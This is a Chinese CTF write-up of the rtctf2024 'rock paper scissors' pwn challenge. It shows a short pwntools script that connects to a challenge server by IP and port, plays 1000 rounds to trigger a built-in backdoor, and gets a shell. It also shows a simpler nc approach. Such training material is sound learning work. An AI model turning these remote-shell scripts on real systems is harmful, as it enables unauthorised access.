# **石头剪刀布：**

拿到可执行文件，拖到IDA里看源码：

首先是一个1000次的for循环

![image-20240520175408557](https://github.com/UUUU66666/rtctf2024/blob/patch-1/Pwn/%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83.assets/image-20240520175408557.png)

我们可以发现当循环1000次执行后，才会执行我们的后门函数：

![image-20240520175547344](https://github.com/UUUU66666/rtctf2024/blob/patch-1/Pwn/%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83.assets/image-20240520175547344.png)

所以现在关键就是如何让这1000次的循环运行完：

到这儿有两种解法：

**第一种**是基于pwntools写一个脚本，接受程序的输出，再向程序输入，主要考察对pwn工具pwntools的使用

脚本如下：（这个脚本是按照石头剪刀布的玩法进行相应的接收和输入，但其实石头剪刀的输赢是没关系的，只要循环1000次就可以了）

```
from pwn import *

p = remote("81.69.243.226", 60579)

# p = process("./rock_paper_scissors")

i = 0

# gdb.attach(p)

for i in range(0,1000):
    p.recvuntil("Computer: \n", drop=True)
    p.recvuntil("->", drop=True)
    str = p.recvline().strip() 
    print(str)
    if str == b'Rock':
        p.recvline(b'You')
        p.sendline("p")
    elif str == b'Scissor':
        p.recvline(b'You')
        p.sendline("r")
    elif str == b'Paper':
        p.recvline(b'You')
        p.sendline("s")
p.interactive()
```

![image-20240520181243938](https://github.com/UUUU66666/rtctf2024/blob/patch-1/Pwn/%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83.assets/image-20240520181243938.png)

这里运行的时间会久一点，毕竟有1000次，可以看到我们不仅成功拿到shell，而且也赢了1000次的石头剪刀布✌

![image-20240520181350975](https://github.com/UUUU66666/rtctf2024/blob/patch-1/Pwn/%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83.assets/image-20240520181350975.png)

**第二种：**就是直接nc连接，直接输入1000个字符，r,s,p都可以：

![image-20240520181542062](https://github.com/UUUU66666/rtctf2024/blob/patch-1/Pwn/%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83.assets/image-20240520181542062.png)

![image-20240520181530551](https://github.com/UUUU66666/rtctf2024/blob/patch-1/Pwn/%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83.assets/image-20240520181530551.png)

尽管输了，但还是拿到shell啦

![image-20240520180907888](https://github.com/UUUU66666/rtctf2024/blob/patch-1/Pwn/%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83.assets/image-20240520180907888.png)

